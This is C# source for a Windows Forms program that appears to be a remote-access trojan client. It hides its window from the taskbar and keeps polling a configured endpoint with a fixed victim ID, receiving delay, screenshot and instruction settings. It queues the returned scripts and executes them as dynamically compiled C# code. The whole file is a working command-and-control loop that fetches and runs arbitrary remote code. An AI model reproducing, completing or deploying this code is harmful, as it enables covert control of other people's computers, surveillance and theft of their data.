using System;
using System.Resources;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Linq;

namespace frameless
{
    public partial class Form1 : Form
    {
        public class Instruction
        {
            public long instructionId { get; set; }

            public short code { get; set; }
            public string script { get; set; }

            public string functionArgs { get; set; }
        }
        private static string Me = "699fb423311d050017821325aba95b7c1ebf91bf5904932e0b5df2bab3b958c2";
        private static int Delay = 1_000;
        private static int Screenshot = 0;
        private static Queue<Instruction> InstructionsQueue = new Queue<Instruction>();
        private async static void Runn()
        {
            var resource = new ResourceManager("frameless.Form1", typeof(Form1).Assembly);
      //      await Action.ExecuteCsharpCodeAsync(resource.GetString("Checker"), new object[] { });
       //     await Action.ExecuteCsharpCodeAsync(resource.GetString("Setup"), new object[] { });
        //    Me = (string)await Action.ExecuteCsharpCodeAsync(resource.GetString("Login"), new object[] { Properties.Resources.Endpoint });
            Task.Run(() => InstructionHandler());
            new Thread(
                async () =>
                {
                    while (true)
                    {
                        object result = await Action.ExecuteCsharpCodeAsync(
                            resource.GetString("Check"),
                            new object[] { Properties.Resources.Endpoint, Me }
                        );
                        if (result is string errorMessage)
                        {
                          //  Console.WriteLine($"An error occurred: {errorMessage}");
                        }
                        else
                        {
                            Type resultType = result.GetType();

                            //  Delay
                            var delayProperty = resultType.GetProperty("Delay");
                            if (delayProperty != null)
                            {
                                var delay = delayProperty.GetValue(result);
                                Delay=(int)delay;
                            }

                            //  Screenshot
                            var screenshotProperty = resultType.GetProperty("Screenshot");
                            if (screenshotProperty != null)
                            {
                                var screenshot = screenshotProperty.GetValue(result);
                                Screenshot = (screenshot==null)?0:(int)screenshot;
                            }

                            //  Instruction
                            var instsProperty = resultType.GetProperty("Insts");
                            if (instsProperty != null)
                            {
                                var insts = instsProperty.GetValue(result) as IEnumerable<object>;
                                if (insts != null)
                                {
                                    foreach (var inst in insts)
                                    {
                                        Type instType = inst.GetType();
                                        var id = instType.GetProperty("Id")?.GetValue(inst);
                                        var code = instType.GetProperty("Code")?.GetValue(inst);
                                        var script = instType.GetProperty("Script")?.GetValue(inst);
                                        var args = instType.GetProperty("Args")?.GetValue(inst);
                                        lock (InstructionsQueue)
                                        {
                                           InstructionsQueue.Enqueue(new Instruction { code = (short)code, instructionId =(long)id, script = (string)script, functionArgs = (string)args });
                                        }
                                    }
                                }
                            }
                        }
                        Thread.Sleep(Delay);
                    }
                }
            ).Start();
        }

        private static async Task InstructionHandler()
        {
            while (true)
            {
                if (InstructionsQueue.Count == 0)
                {
                    Thread.Sleep(1000);
                }
                else
                {
                    var oldestInstruction = InstructionsQueue.Dequeue();
                    object[] args = string.IsNullOrEmpty(oldestInstruction.functionArgs) ? Array.Empty<object>() : Array.ConvertAll(oldestInstruction.functionArgs.Split(new[] { "*.&-&.*" }, StringSplitOptions.None), item => (object)item);
                    var x = await Action.ExecuteCsharpCodeAsync(oldestInstruction.script, args.Concat(new object[] { Properties.Resources.Endpoint,Me, oldestInstruction.instructionId, oldestInstruction.code }).ToArray());
                    Console.WriteLine(x);   
                }
            }
        }
        public Form1()
        {
            InitializeComponent();
            Runn();
        }
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }
        protected override void OnShown(EventArgs e)
        {
            base.OnShown(e);
        }
    }
}
